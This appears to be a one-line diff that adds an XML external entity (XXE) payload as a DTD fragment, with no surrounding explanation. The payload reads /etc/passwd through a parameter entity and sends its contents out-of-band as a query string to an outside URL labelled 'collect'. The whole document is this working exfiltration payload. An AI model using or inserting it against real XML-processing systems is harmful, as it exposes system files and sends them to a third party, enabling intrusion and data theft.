@@ -1,0 +1,1 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM 'https://raw.githubusercontent.com/ID-Serein/xxe-dtd/collect?x=%file;'>">%eval;%oob;
